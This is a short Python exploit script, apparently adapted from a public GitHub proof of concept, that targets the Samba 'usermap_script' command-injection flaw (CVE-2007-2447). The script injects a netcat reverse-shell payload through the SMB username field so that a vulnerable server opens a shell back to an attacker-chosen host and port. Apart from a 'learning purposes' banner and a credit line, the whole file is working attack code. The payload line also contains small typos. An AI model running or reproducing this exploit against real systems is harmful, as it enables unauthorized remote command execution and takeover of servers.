#!/usr/bin/python


#derived from https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py

import sys 
from smb.SMBConnection import SMBConnection 

def exploit(rhost, rport, lhost, lport):
    payload = 'mkfifo /tmp/fun; nc ' +lhost + ' ' + lport + ' 0</tmp/fun | /bin/sh >/tmpfun 2&1; rm /tmp/fun'
    username = "/='nohup " + payload + "'"
    conn = SMBConnection(username, "", "", "")
    try:
        conn.connect(rhost, int(rport), timeout=1)
    except:
        print("[+] Payload Delivered/Check NC")


if __name__ == '__main__':
    print("Utility Tool Derived From Amriunix Script (learning purposed only)")
    print("All Credit to Ousamma Amri")
    print(" Original Script here:  https://github.com/amriunix ")
    if len(sys.argv) != 5:
        print("Follow the Format as Follows: <RHOST> <RPORT> <LHOST> <LPORT> ")
    else:
        print("Attempting to make connection: ")
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]
        exploit(rhost, rport, lhost, lport)